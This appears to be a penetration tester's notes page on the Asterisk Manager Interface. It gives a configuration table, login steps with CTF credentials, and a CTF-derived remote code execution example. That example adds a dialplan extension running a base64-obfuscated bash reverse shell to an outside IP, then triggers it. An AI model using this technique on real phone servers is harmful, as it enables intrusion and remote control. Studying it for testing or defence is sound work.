Reference: http://asteriskdocs.org/en/3rd_Edition/asterisk-book-html-chunk/AMI-configuration.html

# Intro
Option	Value/Example	Description
enabled 	yes 	Enables the AMI. The default is no.
webenabled 	yes 	Allows access to the AMI through the built-in HTTP server. The default is no.[a]
port 	5038 	Sets the port number to listen on for AMI connections. The default is 5038.
bindaddr 	127.0.0.1 	Sets the address to listen on for AMI connections. The default is to listen on all addresses (0.0.0.0). However, it is highly recommended to set this to 127.0.0.1.
tlsenable 	yes 	Enables listening for AMI connections using TLS. The default is no. It is highly recommended to only expose connectivity via TLS outside of the local machine.[b]
tlsbindport 	5039 	Sets the port to listen on for TLS connections to the AMI. The default is 5039.
tlsbindaddr 	0.0.0.0 	Sets the address to listen on for TLS-based AMI connections. The default is to listen on all addresses (0.0.0.0).
tlscertfile 	/var/lib/asterisk/keys/asterisk.pem 	Sets the path to the server certificate for TLS. This is required if tlsenable is set to yes.
tlsprivatekey 	/var/lib/asterisk/keys/private.pem 	Sets the path to the private key for TLS. If this is not specified, the tlscertfile will be checked to see if it also contains the private key.
tlscipher 	< cipher string > 	Specifies a list of ciphers for OpenSSL to use. Setting this is optional. To see a list of available ciphers, run openssl ciphers -v at the command line.
allowmultiplelogin 	no 	Allows the same account to make more than one connection at the same time. The default is yes.
displayconnects 	yes 	Reports connections to the AMI as verbose messages printed to the Asterisk console. This is usually useful, but it can get in the way on a system that uses scripts that make a lot of connections to the AMI. The default is yes.
timestampevents 	no 	Adds a Unix epoch-based timestamp to every event reported to the AMI. The default is no.
brokeneventsaction 	no 	Restores previously broken behavior for the Events AMI action, where a response would not be sent in some circumstances. This option is there for the sake of backward-compatibility for applications that worked around a bug and should not be used unless absolutely necessary. The default is no.
channelvars 	VAR1,VAR2,VAR3[,VAR4[...]] 	Specifies a list of channel variables to include with all manager events that are channel-oriented. The default is to include no channel variables.
debug 	no 	Enables some additional debugging in the AMI code. This is primarily there for developers of the Asterisk C code. The default is no.
httptimeout 	60 	Sets the HTTP timeout, in seconds. This timeout affects users of the AMI over HTTP: it sets the Max-Age of the HTTP cookie, sets how long events are cached to allow retrieval of the events over HTTP using the WaitEvents action, and the amount of time that the HTTP server keeps a session alive after completing an AMI action. The default is 60 seconds.


# How to login
Here you need the user, password and action example:
Action: login
`Username: aeolus`
`Secret: P7xJ6y6x`

From here you can login, if port 5039(since is TLS you need to use openssl)
`openssl s_client -connect IP:port`


```
Action: login
Username: aeolus
Secret: P7xJ6y6x
```
(type manually as in a Serial connection!)


# How to execute commands
As usual you need to start always with action:

```
Action: Command
Command: AMICOMMANDHERE
```


# RCE Example
This is taken by a CTF, using a extension to gain rce on the victim:
1)Rewrite a new extension to run your command:

```
Action: Command
Command: dialplan add extension test,1,system(echo\ YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy81NTU1IDA+JjEi|base64\ -d|bash), into pwned replace
(Extension=test
Priority=1
Application=system level
```
Context=pwned it will be rewritten)

2)Apply the new extension

```
Action: Command
Command: originate local/test@pwned extension test@pwned
(local=is the temp path
test=is the extension
pwned=is the context)
```

In this case will perform a external call from test@pwned -> test@pwned new extension.